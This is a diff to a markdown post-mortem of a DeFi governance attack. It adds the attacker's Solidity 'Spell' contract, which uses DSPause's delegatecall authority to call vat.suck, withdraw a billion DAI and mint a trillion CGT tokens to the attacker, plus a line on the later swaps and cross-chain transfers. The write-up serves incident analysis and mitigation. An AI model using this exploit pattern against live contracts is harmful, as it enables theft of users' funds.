@@ -168,7 +168,24 @@ Finally, make the `delegatecall` from the `DSPauseProxy`:
     }
 ```
 
-Upon making that `delegatecall`, `DSPause` verifies through `DSChief.canCall`, which returned true given the attacker's contract was now the hat. Since `DSPause` executes actions with delegatecall and possessed minting authority for the token, the attacker deployed a malicious custom `Spell` contract to mint tokens directly to their address.
+Upon making that `delegatecall`, `DSPause` verifies through `DSChief.canCall`, which returned true given the attacker's contract was now the hat. Since `DSPause` executes actions with delegatecall and possessed minting authority for the token, the attacker deployed a malicious custom `Spell` contract to mint tokens directly to their address. 
+
+- `Spell` contract:
+```solidity
+    function act(address user, IMERC20 cgt) public {
+        IVat vat = IVat(0x8B2B0c101adB9C3654B226A3273e256a74688E57);
+        IJoin daiJoin = IJoin(0xE35Fc6305984a6811BD832B0d7A2E6694e37dfaF);
+
+        vat.suck(address(this), address(this), 10 ** 9 * 10 ** 18 * 10 ** 27);
+
+        vat.hope(address(daiJoin));
+        daiJoin.exit(user, 10 ** 9 * 1 ether);
+
+        cgt.mint(user, 10 ** 12 * 1 ether);
+    }
+```
+
+Then, the attacker made multiple swaps and cross-chain transfers using different providers.
 
 ## Possible mitigations
 
